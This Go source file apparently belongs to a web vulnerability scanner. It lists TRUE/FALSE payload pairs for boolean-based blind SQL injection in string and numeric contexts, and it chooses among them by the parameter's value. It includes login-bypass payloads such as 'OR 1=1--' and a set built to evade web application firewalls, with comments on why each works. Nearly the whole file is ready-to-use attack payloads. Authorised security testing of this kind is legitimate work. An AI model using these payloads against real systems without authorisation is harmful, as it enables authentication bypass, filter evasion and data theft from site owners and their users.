package sqli_boolean_blind

// payloadPair represents a TRUE/FALSE payload pair for boolean-based blind SQLi testing.
type payloadPair struct {
	context   string // "string", "numeric", "bypass"
	trueVal   string
	falseVal  string
}

// stringPayloads are payloads for string context injection points.
// AND-based payloads are listed first: comment-terminated variants reliably
// create TRUE/FALSE differentials on login forms (the injected condition is
// the sole deciding factor once the rest of the query is commented out),
// while non-comment variants preserve the remainder of the query so the
// original request naturally matches the TRUE response (useful when the
// surrounding conditions also evaluate to true, e.g. correct password).
var stringPayloads = []payloadPair{
	// AND with comment — best for login forms: TRUE returns user, FALSE returns nothing
	{context: "string", trueVal: "' AND 1=1--", falseVal: "' AND 1=2--"},
	// AND without comment — preserves rest of query; original ≈ TRUE when surrounding conditions hold
	{context: "string", trueVal: "' AND '1'='1", falseVal: "' AND '1'='2"},
	// OR with comment — universal bypass
	{context: "string", trueVal: "' OR 1=1--", falseVal: "' OR 1=2--"},
	// OR without comment — works when base value doesn't match any record
	{context: "string", trueVal: "' OR '1'='1", falseVal: "' OR '1'='2"},
	{context: "string", trueVal: "\" OR \"1\"=\"1", falseVal: "\" OR \"1\"=\"2"},
	{context: "string", trueVal: "' AND CASE WHEN 1=1 THEN 1 ELSE 0 END--", falseVal: "' AND CASE WHEN 1=2 THEN 1 ELSE 0 END--"},
}

// numericPayloads are payloads for numeric context injection points.
var numericPayloads = []payloadPair{
	{context: "numeric", trueVal: " AND 1=1--", falseVal: " AND 1=2--"},
	{context: "numeric", trueVal: " AND 1=1", falseVal: " AND 1=2"},
	{context: "numeric", trueVal: " OR 1=1", falseVal: " OR 1=2"},
	{context: "numeric", trueVal: " OR 1=1--", falseVal: " OR 1=2--"},
	{context: "numeric", trueVal: ") OR (1=1", falseVal: ") OR (1=2"},
}

// bypassPayloads are payloads designed to bypass WAFs.
var bypassPayloads = []payloadPair{
	{context: "bypass", trueVal: "'/**/AND/**/1=1--", falseVal: "'/**/AND/**/1=2--"},
	{context: "bypass", trueVal: "'/**/OR/**/1=1--", falseVal: "'/**/OR/**/1=2--"},
	{context: "bypass", trueVal: "' OR 1=1#", falseVal: "' OR 1=2#"},
	{context: "bypass", trueVal: "%27 OR 1=1--", falseVal: "%27 OR 1=2--"},
	{context: "bypass", trueVal: "' OR 1=1;--", falseVal: "' OR 1=2;--"},
}

// getPayloadsForValue selects appropriate payloads based on the parameter's base value.
func getPayloadsForValue(baseValue string) []payloadPair {
	if isNumericValue(baseValue) {
		return append(numericPayloads, bypassPayloads...)
	}
	return append(stringPayloads, bypassPayloads...)
}

// isNumericValue checks if a string looks like a number.
func isNumericValue(s string) bool {
	if s == "" {
		return false
	}
	for i, c := range s {
		if c == '-' && i == 0 {
			continue
		}
		if c == '.' {
			continue
		}
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}
